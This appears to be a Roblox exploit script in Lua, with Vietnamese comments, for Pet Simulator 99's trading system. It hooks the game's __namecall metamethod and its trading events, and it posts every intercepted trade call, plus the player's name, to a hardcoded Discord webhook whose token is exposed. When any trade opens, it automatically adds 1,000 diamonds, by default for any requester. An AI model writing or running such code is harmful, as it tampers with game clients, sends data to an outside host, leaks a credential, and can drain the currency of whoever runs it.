-- PS99 Auto Trade Diamonds - Hook trading system
local W="https://discord.com/api/webhooks/1502609152025952338/9TmUzZ2jRGfdu0tNYMz7lci6s42oYO1Pxj6MvlAU_x8qiMTxcU2awczwsHeYb3SaCDsD"
local Http=game:GetService("HttpService")
local RS=game:GetService("ReplicatedStorage")
local plr=game:GetService("Players").LocalPlayer
local Net=RS.Network

local function d(msg,c) pcall(function() request({Url=W,Method="POST",Headers={["Content-Type"]="application/json"},Body=Http:JSONEncode({embeds={{description=msg,color=c or 0x00ccff}}})}) end) wait(0.5) end

-- Config
local SEND_AMOUNT = 1000   -- Số kim cương tự gửi mỗi trade
local TARGET_USER = ""     -- Để trống = gửi cho ai request cũng nhận
                            -- Hoặc điền tên acc để chỉ gửi cho acc đó

d("💎 **AUTO TRADE DIAMONDS** | `"..plr.Name.."`\n**Số gửi mỗi trade:** "..SEND_AMOUNT.."\n**Target:** "..(TARGET_USER~="" and TARGET_USER or "Tất cả").."", 0xffaa00)

-- =====================================================
-- Hook __namecall để log tất cả trading calls
-- =====================================================
local mt = getrawmetatable(game)
local old = mt.__namecall
local tradeLog = {}

pcall(function()
    setreadonly(mt, false)
    mt.__namecall = newcclosure(function(self, ...)
        local method = getnamecallmethod()
        if method == "FireServer" then
            local name = tostring(self.Name or "")
            if name:find("Trading") or name:find("rading") then
                local args = {...}
                local info = "🔥 FireServer: **"..name.."**\nArgs("..#args.."):"
                for i,v in ipairs(args) do
                    if type(v)=="table" then
                        local tk={}; for k2,v2 in pairs(v) do table.insert(tk,k2.."="..type(v2).."["..tostring(v2):sub(1,15).."]"); if #tk>=5 then break end end
                        info=info.."\n  arg"..i.."=table{"..table.concat(tk,",").."}"
                    else
                        info=info.."\n  arg"..i.."="..type(v).."["..tostring(v):sub(1,30).."]"
                    end
                end
                d(info, 0xff9900)
            end
        end
        return old(self, ...)
    end)
    setreadonly(mt, true)
end)

-- =====================================================
-- Hook OnClientEvent cho tất cả Trading events
-- =====================================================
local tradingEvents = {
    "Trading: Request", "Trading: Created", "Trading: Set Item",
    "Trading: Set Ready", "Trading: Set Confirmed", "Trading: Executing",
    "Trading: Destroyed", "Trading: Message", "Trading: Add History"
}

for _, evName in ipairs(tradingEvents) do
    pcall(function()
        Net[evName].OnClientEvent:Connect(function(...)
            local args={...}
            local info = "📡 **"..evName.."** ← Server\nArgs("..#args.."):"
            for i,v in ipairs(args) do
                if type(v)=="table" then
                    local tk={}
                    for k2,v2 in pairs(v) do
                        table.insert(tk, tostring(k2).."="..type(v2).."["..tostring(v2):sub(1,20).."]")
                        if #tk>=8 then break end
                    end
                    info=info.."\n  ["..i.."]={"..table.concat(tk,", ").."}"
                elseif type(v)=="Instance" then
                    info=info.."\n  ["..i.."]=Instance:"..v.Name.."|"..v.ClassName
                else
                    info=info.."\n  ["..i.."]="..(type(v)).."["..tostring(v):sub(1,30).."]"
                end
            end
            d(info, 0x5599ff)

            -- Khi trade được tạo → tự động thêm diamonds và confirm
            if evName == "Trading: Created" then
                wait(1)
                d("🔄 Trade tạo xong! Thử thêm diamonds...", 0xffaa00)
                -- Thử nhiều format khác nhau
                local formats = {
                    {type="Diamonds", amount=SEND_AMOUNT},
                    {"Diamonds", SEND_AMOUNT},
                    {id="Diamonds", count=SEND_AMOUNT},
                    {currency="Diamonds", value=SEND_AMOUNT},
                }
                for _, fmt in ipairs(formats) do
                    pcall(function()
                        Net["Server: Trading: Set Item"]:FireServer(fmt)
                    end)
                    wait(0.3)
                end
            end
        end)
    end)
end

d("✅ Hook Trading events xong!\n**Bây giờ:** Nhờ ai đó gửi trade request cho `"..plr.Name.."`\nScript sẽ log format và thử auto-confirm với "..SEND_AMOUNT.." diamonds", 0x00ff88)

-- Keep alive
while true do wait(30) end
